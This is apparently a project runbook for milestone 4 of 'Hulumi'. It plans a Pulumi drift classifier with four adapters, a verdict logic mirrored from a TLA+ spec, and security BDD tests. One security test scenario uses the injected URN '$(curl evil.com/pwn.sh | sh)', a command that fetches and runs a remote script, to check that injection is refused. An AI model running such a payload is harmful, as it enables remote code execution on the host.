# Milestone 4 — Drift classifier + 4 adapters + TLA+-bound verdict matrix + security BDDs

Parent runbook: [docs/slo/completed/RUNBOOK-hulumi.md](../completed/RUNBOOK-hulumi.md).

**Goal**: After M4, `@hulumi/drift` is shipped, composing four pluggable adapters (`AutomationApiAdapter`, `CloudTrailAdapter`, `ProviderVersionAdapter`, `GitLogAdapter`) behind a `DriftClassifier` whose verdict logic **exactly matches** `HardenedVerdict` in `docs/TLAdocs/hulumi/HulumiDrift.tla`. A BDD feature file walks the 5-row verdict matrix from [HulumiDrift.trace.md](../TLAdocs/hulumi/HulumiDrift.trace.md) cell by cell (critique E6). Six security BDDs land: shell-injection refusal on `GitLogAdapter` (S3), shallow-clone guard (E5), cache file perms `0600` (S2), probe-timeout graceful degradation (E1), namespace-rejection (E4), cache-based rate limit (S7).

**Context**: M1–M3 shipped the threat-model skill and two baseline components. M4 delivers Hulumi's genuinely novel capability — a drift classifier that distinguishes provider-API churn from console break-glass from genuine IaC drift, local-first, no hosted service. [interfaces.md §3](../design/hulumi/interfaces.md) defines the stable surface. [HulumiDrift-verified.md](../TLAdocs/hulumi/HulumiDrift-verified.md) is the authoritative spec. `hulumi-drift` and `hulumi-check` skills are deferred to v1.1+ per [interfaces.md §5](../design/hulumi/interfaces.md); M4 ships the library surface only.

**Important design rule**: **TypeScript's `HardenedVerdict` is the TLA+ `HardenedVerdict` in another language.** Drift between them is the exact thing this milestone prevents. The verdict-matrix BDD feature file literally walks each row from the trace. A PR that changes either TS or TLA+ without the paired update fails CI.

**Refactor budget**: `No refactor in M1/M2/M3 files. M4 is entirely additive: new @hulumi/drift package, new scenario forward-reference updates (append, don't edit), new docs.`

## Contract Block

| Field                         | Value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Inputs                        | Pulumi stack reference + `ClassifyOptions { window?, minConfidence?, requireAdapters? }`. AWS creds (env / profile / OIDC). Local git repo read access. `@pulumi/aws` registry read.                                                                                                                                                                                                                                                                                                                                                                                            |
| Outputs                       | `DriftVerdict { resource, source, confidence, evidence[], recommendation? }` per affected resource. Persisted to `.hulumi/drift-cache/<stack-urn-hash>.json` chmod 0600. Invalidated on provider-version change, git HEAD change, or TTL (default 6h).                                                                                                                                                                                                                                                                                                                          |
| Interfaces touched            | `DriftClassifier`, `DriftSource` enum, `DriftVerdict`, `DriftAdapter`, 4 adapter classes, `ClassifyOptions`, `Evidence`. AWS tag filter requires `hulumi:` namespace (E4). All `stable` per [interfaces.md §3](../design/hulumi/interfaces.md).                                                                                                                                                                                                                                                                                                                                 |
| Files allowed to change       | **New**: `packages/drift/**`, `examples/drift-classify-smoke/**`, `docs/components/drift-classifier.md`, `docs/drift-classifier-deployment.md`. **Edits**: `packages/baseline/src/aws/index.ts` (no exports change; M4 additive), `docs/components/README.md`, `skills/hulumi-threat-model/scenarios/{s3-public-bucket-hardening,aws-multi-account-baseline}.json` (append drift-classifier mention), root `package.json`, `.github/workflows/ci.yml` (drift-mocks job), `.github/workflows/weekly-integration.yml` (append drift e2e), `.gitignore`.                           |
| Files to read before changing | [HulumiDrift.tla](../TLAdocs/hulumi/HulumiDrift.tla), [trace](../TLAdocs/hulumi/HulumiDrift.trace.md), [verified](../TLAdocs/hulumi/HulumiDrift-verified.md), [interfaces.md §3+§4+§6](../design/hulumi/interfaces.md), [ARCHITECTURE.md](../design/hulumi/ARCHITECTURE.md), [critique.md (E1,E4,E5,E6,S2,S3,S7)](../critique/hulumi.md), lessons m1-m3, [CloudTrail LookupEvents](https://docs.aws.amazon.com/awscloudtrail/latest/APIReference/API_LookupEvents.html), [simple-git README](https://github.com/steveukx/git-js#readme).                                        |
| New files allowed             | As listed.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| New dependencies allowed      | Runtime (drift), exact-pinned + integrity hashes: `@aws-sdk/client-cloudtrail`, `@aws-sdk/client-sts`, `@aws-sdk/credential-providers`, `simple-git` (argv-based git — **S3 MANDATORY**), `p-timeout`. Dev: `memfs`, `tmp` (test-only). **`child_process.exec` FORBIDDEN in `packages/drift/src/`** — lint-enforced.                                                                                                                                                                                                                                                            |
| Migration allowed             | `no`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Compatibility commitments     | M1+M2+M3 unchanged. `@hulumi/drift` exports match [interfaces.md §3](../design/hulumi/interfaces.md). `DriftSource` values lock to TLA+ `Source` set. Cache schema versioned `schemaVersion: 1`.                                                                                                                                                                                                                                                                                                                                                                                |
| Forbidden shortcuts           | (a) **No `child_process.exec`** anywhere in `packages/drift/src/` (S3). (b) No shell-string interpolation of URNs/stack names. (c) No disabling monotonicity. (d) No `setTimeout`/`sleep` in probe — use `p-timeout` with `AbortSignal`. (e) No retry loop on CloudTrail 5xx exceeding probe timeout. (f) No cache file with default umask — 0600 helper always (S2). (g) No bare-tag match — `hulumi:` namespace required (E4). (h) No `ProviderApiChurn @ high` ever (TLA+-proven upper bound is `medium`). (i) No extending `DriftSource` enum without TLA+ re-verification. |

## Out of Scope / Must Not Do

- No `hulumi-drift` skill — v1.1+.
- No `hulumi-check` skill — v1.1+.
- No standalone `hulumi` CLI — v1.1+.
- No SLSA release, no npm publish — M5.
- No SCP template — M5. Dogfood adoption is sunlit-guardian's runbook, not part of any Hulumi milestone.
- No auto-remediation — verified-design §Simplifications #5 excludes it.
- No Azure/GCP adapters.
- No cross-stack drift aggregation — per-stack only in v1.
- No extending `DriftSource` — locked set.
- No telemetry.

## Pre-Flight

1. Global Entry Rules.
2. Read `docs/slo/lessons/hulumi-m{1,2,3}.md`; apply corrections.
3. Read the TLA+ trio in full — `HardenedVerdict` is the authoritative spec.
4. Read allowed files.
5. Copy Evidence Log template.
6. Re-state six load-bearing constraints: (i) TS `HardenedVerdict` exactly matches TLA+; (ii) verdict-matrix BDD walks every row from trace; (iii) GitLogAdapter uses `simple-git` only; (iv) cache chmod 0600; (v) probe timeout configurable default 60s, graceful to `Unknown/low`; (vi) CloudTrail filter requires `hulumi:` namespace.

## Files Allowed To Change

| File                                                                                                | Planned Change                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `packages/drift/package.json`                                                                       | NEW: `@hulumi/drift`, peer-dep `@pulumi/pulumi` exact-pinned, runtime deps listed above                                                                                     |
| `packages/drift/tsconfig.json`                                                                      | NEW                                                                                                                                                                         |
| `packages/drift/src/index.ts`                                                                       | NEW: re-exports all stable types + `DriftClassifier` + 4 adapters                                                                                                           |
| `packages/drift/src/types.ts`                                                                       | NEW: `DriftSource` enum (matches TLA+ `Source`), `Confidence`, `DriftVerdict`, `Evidence`, `DriftAdapter`, `AdapterSignal`, `ClassifyOptions`, `RemediationHint`            |
| `packages/drift/src/verdict.ts`                                                                     | NEW: `hardenedVerdict(snapshot)` — TLA+ mirror. Top comment with link + one-sentence "TS mirror of TLA+ `HardenedVerdict`. Keep in lockstep."                               |
| `packages/drift/src/classifier.ts`                                                                  | NEW: orchestrates adapters in parallel via `Promise.allSettled`, composes evidence, enforces monotonicity, writes cache                                                     |
| `packages/drift/src/monotonicity.ts`                                                                | NEW: cache-write guard refusing demotions except via `CacheInvalidate`                                                                                                      |
| `packages/drift/src/cache.ts`                                                                       | NEW: on-disk cache with mandatory `fs.chmod(path, 0o600)`; owner-check on read; TTL; rate-limit via cache-first consult (S7)                                                |
| `packages/drift/src/probe.ts`                                                                       | NEW: CloudTrail delivery probe; emits tagged sentinel event; polls `LookupEvents`; wraps `p-timeout` (60s default); on timeout → `ProbeUnavailable` → classifier falls back |
| `packages/drift/src/adapters/automation-api.ts`                                                     | NEW: Pulumi Automation API `refresh --preview-only`; harvests `ChangeSummary` + `detailedDiff`                                                                              |
| `packages/drift/src/adapters/cloudtrail.ts`                                                         | NEW: `LookupEvents` scoped to resource ARN + window. **Tag filter requires `hulumi:` namespace; bare `iac-role=true` NOT accepted** (E4)                                    |
| `packages/drift/src/adapters/provider-version.ts`                                                   | NEW: pinned `@pulumi/aws` in `pnpm-lock.yaml` vs `latest` via npm registry                                                                                                  |
| `packages/drift/src/adapters/git-log.ts`                                                            | NEW: `simple-git` argv-based. Shallow-clone check → `available()=false` (E5)                                                                                                |
| `packages/drift/src/urn-sanitize.ts`                                                                | NEW: treats URNs as opaque data. Documented why (S3)                                                                                                                        |
| `packages/drift/tests/verdict-matrix.feature.test.ts`                                               | NEW: **load-bearing**. Walks 5-row matrix from `HulumiDrift.trace.md`. Each row one Vitest test. Values parsed from trace-md's table via `tests/_utils/trace-parser.ts`     |
| `packages/drift/tests/cache-permissions.test.ts`                                                    | NEW: asserts `fs.stat().mode & 0o777 === 0o600` (S2)                                                                                                                        |
| `packages/drift/tests/shell-injection.test.ts`                                                      | NEW: URN with `$(echo INJECTED)` etc; asserts zero non-`simple-git` spawns via spy (S3)                                                                                     |
| `packages/drift/tests/shallow-clone.test.ts`                                                        | NEW: `git clone --depth=1` fixture; `GitLogAdapter.available()=false`; fallback path (E5)                                                                                   |
| `packages/drift/tests/probe-timeout.test.ts`                                                        | NEW: force `LookupEvents` hang; 1s timeout in test; `Unknown/low` + `probeFailedAt` (E1)                                                                                    |
| `packages/drift/tests/namespace-rejection.test.ts`                                                  | NEW: bare `iac-role=true` NOT filtered; `hulumi:iac-role=true` IS filtered (E4)                                                                                             |
| `packages/drift/tests/monotonicity.test.ts`                                                         | NEW: seeds cache `{ConsoleBreakGlass, high}`; runs state that would produce `{Unknown, low}`; asserts cache unchanged                                                       |
| `packages/drift/tests/rate-limit.test.ts`                                                           | NEW: two classifies inside TTL; second returns cached; zero adapter calls (S7)                                                                                              |
| `packages/drift/tests/tla-alignment.test.ts`                                                        | NEW: meta-test. Greps `verdict.ts` for TLA+ link; greps `HulumiDrift-verified.md` for `verified_at`; fails if > 30 days stale                                               |
| `packages/drift/tests/integration/drift-classify.integration.test.ts`                               | NEW: weekly only against M3 sandbox. Creates deliberate ConsoleMutate via non-IaC principal; asserts verdict `ConsoleBreakGlass/high`. Teardown via M3 pattern.             |
| `packages/drift/README.md`                                                                          | NEW                                                                                                                                                                         |
| `examples/drift-classify-smoke/{Pulumi.yaml,index.ts,package.json,README.md}`                       | NEW: two deliberate drifts (console + provider-version)                                                                                                                     |
| `docs/components/drift-classifier.md`                                                               | NEW: adapter config, verdict-matrix table (paraphrased from TLA+ trace), TLA+ bound summary, probe deployment                                                               |
| `docs/drift-classifier-deployment.md`                                                               | NEW: CI OIDC for CloudTrail, probe timeout, cache TTL, SCP pointer (M5) for tag-integrity                                                                                   |
| `docs/components/README.md`                                                                         | EDIT: index `@hulumi/drift` + `DriftClassifier`                                                                                                                             |
| `skills/hulumi-threat-model/scenarios/{aws-multi-account-baseline,s3-public-bucket-hardening}.json` | EDIT (append): `recommended_components` adds "post-deployment drift triage via `@hulumi/drift.DriftClassifier`"                                                             |
| Root `package.json`                                                                                 | EDIT: scripts `test:drift`, `test:drift:integration`                                                                                                                        |
| `.github/workflows/ci.yml`                                                                          | EDIT: add `drift-mocks` job every PR                                                                                                                                        |
| `.github/workflows/weekly-integration.yml`                                                          | EDIT: append drift-classify stage after AccountFoundation teardown — create drift fixture, classify, assert, clean up                                                       |
| `.gitignore`                                                                                        | EDIT: `.hulumi/drift-cache/`                                                                                                                                                |

## Step-by-Step

1. Write BDD test stubs first for all rows. Start with `verdict-matrix.feature.test.ts` (reads trace-md).
2. Add new deps to `packages/drift/package.json`; exact pin; commit lockfile; record hashes.
3. Implement `types.ts` → `verdict.ts` (TLA+ mirror) → `monotonicity.ts` → `cache.ts` (0600) → `probe.ts` (p-timeout).
4. Implement 4 adapters in isolation with unit tests before composition.
5. Implement `DriftClassifier` composing adapters + monotonicity + cache.
6. Make `verdict-matrix.feature.test.ts` pass — all 5 rows.
7. Make 6 security BDDs pass.
8. Wire `examples/drift-classify-smoke/` end-to-end on mocks.
9. Add `drift-mocks` CI job; append drift stage to weekly workflow.
10. `git status` clean; `.gitignore` updated; lessons + completion + Milestone Tracker.

## BDD Acceptance Scenarios

**Feature: `DriftClassifier` emits TLA+-bound verdicts across the 5-row matrix and survives adversarial adapter behaviour**

| Scenario                                                     | Category                                       | Given                                                                                        | When                              | Then                                                                                                                          |
| ------------------------------------------------------------ | ---------------------------------------------- | -------------------------------------------------------------------------------------------- | --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Row 1 — clean → None                                         | happy path (matrix walk)                       | `mutated=F`                                                                                  | `classifier.classify(stack)`      | verdict `{ source: "None", confidence: "none" }`; cache written                                                               |
| Row 2 — event delivered → ConsoleBreakGlass/high             | happy path (matrix walk)                       | `mutated=T, eventDelivered=T`                                                                | classify                          | `{ source: "ConsoleBreakGlass", confidence: "high" }`; evidence includes CloudTrail event                                     |
| Row 3 — pending, not delivered → Unknown/low                 | happy path (matrix walk, E1+S7+TLA+ core race) | `mutated=T, eventDelivered=F, eventInTransit=T`                                              | classify                          | `{ source: "Unknown", confidence: "low" }`; evidence `probeUnresolved: true`                                                  |
| Row 4 — no pending, provider drift → ProviderApiChurn/medium | happy path (matrix walk, TLA+ ceiling)         | `mutated=T, eventDelivered=F, eventInTransit=F, providerDrift=T`                             | classify                          | `{ source: "ProviderApiChurn", confidence: "medium" }`; **NEVER `high`**; evidence `providerDriftAt` + pinned-vs-latest delta |
| Row 5 — no pending, no provider drift → Unknown/low          | happy path (matrix walk)                       | `mutated=T, eventDelivered=F, eventInTransit=F, providerDrift=F`                             | classify                          | `{ source: "Unknown", confidence: "low" }`                                                                                    |
| TLA+ drift fails meta-test                                   | schema / regression (E6)                       | edit `verdict.ts` to emit `ProviderApiChurn @ high` Row 4                                    | `pnpm -r test`                    | Row 4 fails; `tla-alignment.test.ts` flags                                                                                    |
| Monotonicity — high not silently demoted                     | concurrency / safety                           | cache seeded `{ConsoleBreakGlass, high}`; new run produces `{Unknown, low}`                  | classify                          | cache unchanged                                                                                                               |
| Cache file perms 0600                                        | security (S2)                                  | any classify                                                                                 | `fs.stat(cachePath).mode & 0o777` | 0o600                                                                                                                         |
| Cache owner-check refuses foreign                            | security (S2)                                  | cache file from another UID (memfs)                                                          | classify reads cache              | treated as absent; re-runs; evidence `cacheOwnershipMismatch`                                                                 |
| Shell-injection refused on URNs                              | security (S3)                                  | URN `$(curl evil.com/pwn.sh \| sh)`                                                          | `GitLogAdapter.signal`            | safe error; zero subshell spawns; spy-asserted; degraded `Unknown/low` if other adapters inconclusive                         |
| Shallow-clone guard                                          | reliability (E5)                               | `--depth=1` fixture                                                                          | `GitLogAdapter.available()`       | `false`; classify degrades to `Unknown/low` with remediation message                                                          |
| Probe timeout graceful                                       | reliability (E1)                               | `LookupEvents` hangs                                                                         | classify with timeout=1s          | probe aborts; `Unknown/low`; evidence `probeFailedAt` populated                                                               |
| Namespace rejection                                          | security (E4)                                  | mock events with `iac-role=true` (bare) AND `hulumi:iac-role=true`                           | `CloudTrailAdapter.signal`        | bare NOT filtered (flows as console mutation); prefixed IS filtered                                                           |
| Rate-limit inside TTL (S7)                                   | cost / abuse                                   | two `classify()` within TTL                                                                  | second call                       | cached return; adapters' `signal()` spies zero new calls                                                                      |
| Integration — real console drift (weekly)                    | e2e weekly                                     | sandbox with deliberately console-mutated bucket tagged `hulumi:component=AccountFoundation` | workflow                          | verdict `ConsoleBreakGlass/high`; teardown removes fixture                                                                    |
| Integration — provider-version bump (weekly)                 | e2e weekly                                     | pinned N, latest N+1, no console events                                                      | workflow                          | verdict `ProviderApiChurn/medium`; never high                                                                                 |
| No `child_process.exec`                                      | forbidden-shortcut (S3)                        | CI grep `packages/drift/src/`                                                                | step                              | zero hits                                                                                                                     |
| No `setTimeout`/`sleep`                                      | forbidden-shortcut                             | CI grep outside tests                                                                        | step                              | zero hits (probe uses `p-timeout` + `AbortSignal`)                                                                            |
| DriftSource closed to TLA+ set                               | schema / regression                            | add value to enum                                                                            | CI lint                           | lint compares against TLA+ `Source` (parsed); mismatch fails                                                                  |

## Regression Tests

- Full M1+M2+M3 BDDs green.
- M3 weekly workflow AccountFoundation stage unchanged and green.
- IDs-only lint on new source + dist.
- Skill scenarios still valid with appended mention; frontmatter schema unchanged.
- agentskills.io still validates SKILL.md.
- M2 + M3 snapshots unchanged.

## Compatibility Checklist

- [ ] `@hulumi/baseline` public API unchanged.
- [ ] `@hulumi/policies` public API unchanged.
- [ ] `@hulumi/drift` matches [interfaces.md §3](../design/hulumi/interfaces.md) (TS assignability).
- [ ] `DriftSource` exactly matches TLA+ `Source` (lint).
- [ ] Cache schema `schemaVersion: 1`.
- [ ] AWS tag filter requires `hulumi:` namespace (E4 BDD).
- [ ] `@pulumi/*` exact pins unchanged from M3.
- [ ] New deps exact-pinned with integrity hashes.
- [ ] `pnpm install && pnpm -r build && pnpm -r test && pnpm -r lint && pnpm -r typecheck` green on Node 20 LTS.
- [ ] Skill works on 5 M1 scenarios; two reference `DriftClassifier`.

## E2E Runtime Validation

**File**: `packages/drift/tests/verdict-matrix.feature.test.ts`

| E2E Test                                               | What It Proves                      | Pass Criteria                                 |
| ------------------------------------------------------ | ----------------------------------- | --------------------------------------------- |
| `matrix_row_1_none` through `matrix_row_5_unknown_low` | Each row matches TLA+-bound verdict | Input → expected output; parsed from trace-md |
| `row_count_matches_trace_md`                           | No silent row drift                 | Rows in trace-md = tests run                  |

**File**: `packages/drift/tests/security-bdds.test.ts`

| E2E Test                  | What It Proves | Pass Criteria                          |
| ------------------------- | -------------- | -------------------------------------- |
| `cache_perms_0600`        | S2             | mode masked = 0o600                    |
| `cache_owner_check`       | S2             | foreign UID absent; re-runs            |
| `shell_injection_refused` | S3             | zero subshell spawns on metacharacters |
| `shallow_clone_fallback`  | E5             | `available()=false`; degraded          |
| `probe_timeout_graceful`  | E1             | Unknown/low; `probeFailedAt`           |
| `namespace_rejection`     | E4             | bare not filtered; prefixed filtered   |
| `rate_limit_cache_hit`    | S7             | second call cached; zero adapter calls |

**File**: `packages/drift/tests/integration/drift-classify.integration.test.ts` (weekly)

| E2E Test                              | What It Proves                 | Pass Criteria                                                            |
| ------------------------------------- | ------------------------------ | ------------------------------------------------------------------------ |
| `integration_console_drift_detected`  | End-to-end console break-glass | Real mutation → ConsoleBreakGlass/high; teardown succeeds                |
| `integration_provider_drift_detected` | End-to-end provider bump       | Pinned offset → ProviderApiChurn/medium; never high                      |
| `integration_cache_survives_ttl`      | Cache persistence              | Second invocation within 6h returns identical verdict without re-polling |
| `integration_teardown_on_failure`     | Cost safety                    | Force-fail variant completes; fixture removed                            |

## Smoke Tests

- [ ] `pnpm install && pnpm -r build && pnpm -r test && pnpm -r lint && pnpm -r typecheck` → green.
- [ ] `cd examples/drift-classify-smoke && node dist/index.js` → emits verdicts for both fixtures.
- [ ] Edit `verdict.ts` to `ProviderApiChurn/high` Row 4 → Row 4 fails → revert.
- [ ] Edit trace-md to add 6th row → `row_count_matches_trace_md` fails → revert.
- [ ] `find packages/drift/src -name '*.ts' | xargs grep -l 'child_process'` → zero.
- [ ] `find packages/drift/src -name '*.ts' | xargs grep -l 'setTimeout\|sleep'` → zero.
- [ ] Write cache file with 0644 manually; classifier refuses and recomputes.
- [ ] `pulumi up` real test stack in sandbox; console-modify a bucket; classify → `ConsoleBreakGlass/high`.
- [ ] `gh workflow run weekly-integration.yml` → drift stage runs after AccountFoundation, teardown clean.
- [ ] `git status` clean.

## Evidence Log

| Step                      | Command / Check                                                      | Expected                             | Actual | Pass/Fail | Notes |
| ------------------------- | -------------------------------------------------------------------- | ------------------------------------ | ------ | --------- | ----- |
| Baseline (M1-M3)          | `pnpm -r test` pre-edits                                             | green                                |        |           |       |
| Deps pinned               | `pnpm list @aws-sdk/client-cloudtrail simple-git p-timeout`          | exact + integrity hashes             |        |           |       |
| BDD stubs                 | all files                                                            | fail expectedly                      |        |           |       |
| Impl — core               | types + verdict + monotonicity + cache + probe                       | tests pass                           |        |           |       |
| Impl — 4 adapters         | isolation unit tests                                                 | each passes                          |        |           |       |
| Impl — classifier         | composition                                                          | integration mocks pass               |        |           |       |
| Verdict matrix BDD        | `verdict-matrix.feature.test.ts`                                     | 5 rows green; row-count verified     |        |           |       |
| Security BDDs             | cache perms, shell, shallow, probe, namespace, rate-limit            | all green                            |        |           |       |
| TLA+ alignment meta       | `tla-alignment.test.ts`                                              | passes (<30 days stale)              |        |           |       |
| Example smoke             | mocked verdicts emitted                                              |                                      |        |           |       |
| CI drift-mocks            | PR CI                                                                | green on noop; fails on seeded-drift |        |           |       |
| Weekly integration manual | `gh workflow run`                                                    | drift created, classified, cleaned   |        |           |       |
| First scheduled weekly    | Sunday 04:00 UTC                                                     | green                                |        |           |       |
| Forbidden-shortcut lint   | `child_process.exec`, `setTimeout`, `sleep` in `packages/drift/src/` | zero                                 |        |           |       |
| Enum-closed lint          | `DriftSource` vs TLA+                                                | match                                |        |           |       |
| License-boundary lint     | `dist/`                                                              | no hits                              |        |           |       |
| Full tests                | green                                                                |                                      |        |           |       |
| Build / lint / typecheck  | green                                                                |                                      |        |           |       |
| Exact-pin-guard           | passes with new pins                                                 |                                      |        |           |       |
| Smoke tests               | all checked                                                          |                                      |        |           |       |
| Test artifact cleanup     | `git status`                                                         | clean                                |        |           |       |
| .gitignore review         | `.hulumi/drift-cache/` present                                       | clean                                |        |           |       |
| Compatibility             | M1-M3 regression                                                     | green                                |        |           |       |

## Definition of Done

- All M4 BDDs pass (mocked + integration).
- Verdict-matrix 5 rows + `row_count_matches_trace_md` pass.
- 6 security BDDs pass.
- TLA+ alignment meta-test passes.
- ≥1 weekly scheduled run green during M4 review window with drift stage.
- Full M1-M4 test suite green.
- Smoke tests checked.
- Compatibility complete.
- Forbidden shortcuts absent.
- `DriftSource` enum values exactly match `Source` in `HulumiDrift.tla`.
- `git status` clean.
- `.gitignore` updated.
- `docs/components/drift-classifier.md`, `docs/drift-classifier-deployment.md` complete.
- `docs/slo/lessons/hulumi-m4.md` + `docs/slo/completion/hulumi-m4.md` written.
- Milestone Tracker `done`.

## Post-Flight

- **ARCHITECTURE.md** (Hulumi): update Key Components + Data Flow with `@hulumi/drift` + 4 adapters; note M5 adds SLSA-L3 + SCP.
- **README.md**: quick-start for drift classification; link to docs + TLA+ verified-design.
- **Other docs**: `docs/deployment/README.md` pointer to `drift-classifier-deployment.md`.

## Notes

- `verdict-matrix.feature.test.ts` parses trace-md at test time (intentional): any trace edit propagates; TS drift caught without hand-sync. Parser ~20 LOC in `tests/_utils/trace-parser.ts`.
- Production probe sentinel: `ResourceGroupsTaggingAPI.TagResources` on a Hulumi-owned sentinel S3 object tagged `hulumi:probe-sentinel=true` — CloudTrail-observable, idempotent, near-zero cost. Deployment docs cover one-time setup.
- Rate-limit via cache-first (S7): the cache IS the rate-limit. Within TTL, repeat calls return cached verdict; no adapter re-invoked. Not a separate subsystem.
- Monotonicity enforced in one function. Directly tested; implicitly tested by every BDD run.
- Weekly integration's deliberate console drift: workflow assumes a DIFFERENT sandbox role (not IaC), `aws s3api put-bucket-tagging` on the AccountFoundation log bucket. Clear fixture with no teardown cascades.
